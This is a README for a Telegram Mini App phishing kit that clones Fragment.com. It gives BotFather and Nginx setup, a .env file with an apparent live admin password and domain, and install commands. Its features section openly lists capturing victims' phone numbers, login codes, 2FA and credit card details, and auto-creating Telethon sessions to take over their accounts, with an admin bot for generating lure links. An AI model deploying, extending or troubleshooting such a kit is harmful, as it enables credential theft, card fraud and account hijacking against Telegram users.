# Fragment Mini App System

This project is a cloning system of Fragment.com designed for Telegram Mini Apps. It includes a backend for data capture, a frontend mimicking Fragment, and an Admin Bot for control.

## ⚠️ Important Setup for the Mini App
The reason your link redirects to a channel is because the **Mini App Web App URL** is not correctly set in Telegram.

### How to Fix the Redirect:
If clicking the Telegram link redirects you to `https://smskenya.net/` (hitting port 8080) instead of opening the Mini App, it's because **BotFather** is configured to point at your root domain.

1. Open **@BotFather** on Telegram.
2. Select your second bot (`@fremanet_bot` or similar).
3. Select your Mini App (`fragment`).
4. Click **Edit Web App URL**.
5. Set it to **exactly** this: `https://smskenya.net/fragment/`
   - *Note: It must start with `https` and end with `/fragment/`.*
6. Before testing on Telegram, open `https://smskenya.net/fragment/` in your browser. If you see the Fragment site, the backend is working. If you see port 8080, your Nginx is wrong.

### 📡 Recommended Nginx Configuration
Since your root `/` is used by another service, use this for `/fragment`:
```nginx
location /fragment/ {
    proxy_pass http://127.0.0.1:8000/fragment/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}

location /fragment {
    # This handles the case where the user forgets the trailing slash
    return 301 https://$host/fragment/;
}
```
*Remove the `proxy_redirect` lines from your current config, as they can cause unexpected redirects to the root.*

---

## 🚀 Deployment Guide

### 1. Requirements
- Python 3.10+
- Node.js & npm
- A Domain with SSL (e.g., `https://smskenya.net`)

### 2. Environment Configuration
Create a file named `.env` in the root directory and add:
```env
ADMIN_BOT_TOKEN=YOUR_FIRST_BOT_TOKEN
MINI_APP_BOT_TOKEN=YOUR_SECOND_BOT_TOKEN
MINI_APP_USERNAME=selling # The username of your second bot
ADMIN_PASSWORD=samiristhegoat
DOMAIN=smskenya.net
TELEGRAM_API_ID=YOUR_API_ID
TELEGRAM_API_HASH=YOUR_API_HASH
```
*Note: Get `TELEGRAM_API_ID` and `TELEGRAM_API_HASH` from https://my.telegram.org.*

### 3. Installation & Run
```bash
# Install Python libraries
pip install aiogram telethon fastapi uvicorn python-dotenv

# Build the Frontend
cd design
npm install
npm run build
cd ..

# Start the system
python3 run.py
```

## 🛠 Features
- **Admin Bot**: Control everything from one bot.
  - Send `/start` and enter the password.
  - Generate "Automated" links (shows victim's own info).
  - Generate "Custom" links (shows specific username/pfp/price).
- **Data Capture**: Captures Phone Number, Login Code, 2FA, and Credit Card details.
- **Auto-Login**: If API ID/Hash are provided, the system attempts to create a Telethon session automatically when the code is submitted.
- **Persistence**: All submissions are saved to `submissions.txt` and sessions are stored in the `sessions/` folder.

## 📡 Nginx Configuration (Example)
Since your root `/` is taken by another service on port 8080, we use the `/fragment` path:
```nginx
location /fragment {
    proxy_pass http://localhost:8000/fragment;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}
```
*Don't forget to use Certbot for SSL.*
